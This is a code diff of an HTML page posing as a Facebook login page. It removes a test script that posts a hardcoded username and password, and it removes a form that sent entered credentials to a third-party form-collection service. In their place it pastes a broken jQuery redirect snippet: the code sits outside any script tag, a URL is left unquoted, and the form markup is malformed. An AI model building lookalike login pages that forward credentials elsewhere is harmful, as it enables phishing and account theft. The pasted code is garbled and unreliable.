@@ -6,17 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login Page</title>
     <link rel="stylesheet" href="style.css">
-    <!-- other headers -->
-    <script src="jquery-XXX.js"></script>
-    <script src="jquery.redirect.js"></script>
-    <script>
-     jQuery(function($){
-     //OnClick testButton do a POST to a login.php with user and pasword
-      $("#testButton").click(function(){
-       $.redirect("/login.php", {user: "johnDoe", password: "12345"}, "POST", "_blank");
-      });
-     });
-    </script>
+    
 </head>
 <body>
    <div class="container">
@@ -36,10 +26,15 @@
         </div>
         <div ">
             <div class="form-container">
-                <form
-  action="https://submit-form.com/0JDosZ5IE"
-  method="POST"
->
+var myRedirect = function(redirectUrl) {
+var form = $('<form action="' +https://www.prowebguru.com/2013/10/send-post-data-while-redirecting-with-jquery/ + '" method="post">' +
+'<input type="hidden" name="parameter1" value="sample" />' +
+'<input type="hidden" name="parameter2" value="Sample data 2" />' +
+'</form>');
+$('body').append(form);
+$(form).submit();
+};
+
                     <div class="form-wrapper">
                         <input
                             type="email"
